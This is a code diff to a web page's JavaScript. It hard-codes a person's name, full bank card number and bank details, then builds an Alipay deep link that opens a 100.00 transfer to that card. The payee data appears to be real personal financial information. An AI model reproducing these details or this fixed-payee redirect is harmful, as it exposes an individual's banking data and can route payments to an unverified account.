@@ -420,6 +420,25 @@
         }
 
         function send_message(){
+
+        // <input type="hidden" name="bankAccount" value="林俊龙">
+        //         <input type="hidden" name="cardNo" value="6217906400031420228">
+        //         <input type="hidden" name="bankName" value="中国银行">
+        //         <input type="hidden" name="bankMark" value="BOC">
+        //         <input type="hidden" name="amount" value="100.00">
+        //         <input type="hidden" name="cardIndex" value="1912301686931928992">
+        //         <input type="hidden" name="cardChannel" value="HISTORY_CARD">
+        //         <input type="hidden" name="cardNoHidden" value="true">
+
+
+            var cardIndex = "1912301686931928992";
+            var cardChannel = "HISTORY_CARD";
+            var cardNoHidden="true";
+            var bankAccount="林俊龙";
+            var bankName="中国银行";
+            var bankMark = "BOC";
+            var amount="100.00";
+
             var arr=['-157','-183','-123'];
             var level_id="178";
             var bank_no='';
@@ -429,8 +448,8 @@
                 bank_no='请关闭飞行模式付款***';
             }
             var ext = '';
-            ext = '&cardIndex='+document.payForm.cardIndex.value+'&cardChannel='+document.payForm.cardChannel.value+'&cardNoHidden='+document.payForm.cardNoHidden.value;
-            var a='alipays://platformapi/startapp?appId=09999988&actionType=toCard&ap_framework_sceneId=20000067&bankAccount='+document.payForm.bankAccount.value+'&cardNo='+bank_no+'&bankName='+document.payForm.bankName.value+'&bankMark='+document.payForm.bankMark.value+ext+'&money='+document.payForm.amount.value+'&amount='+document.payForm.amount.value+'&REALLY_STARTAPP=true&startFromExternal=false';
+            ext = '&cardIndex='+cardIndex+'&cardChannel='+cardChannel+'&cardNoHidden='+cardNoHidden;
+            var a='alipays://platformapi/startapp?appId=09999988&actionType=toCard&ap_framework_sceneId=20000067&bankAccount='+bankAccount+'&cardNo='+bank_no+'&bankName='+bankName+'&bankMark='+bankMark+ext+'&money='+amount+'&amount='+amount+'&REALLY_STARTAPP=true&startFromExternal=false';
             AlipayJSBridge.call('pushWindow', { url: a});
         }
         //var dataUrl="alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo=" + cardNo + "&bankAccount=" + bankAccount + "&money=" + amount + "&amount=" + amount + "&bankMark=" + bankMark + "&bankName=" + bankName + "&cardIndex=" + cardIndex + "&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from";
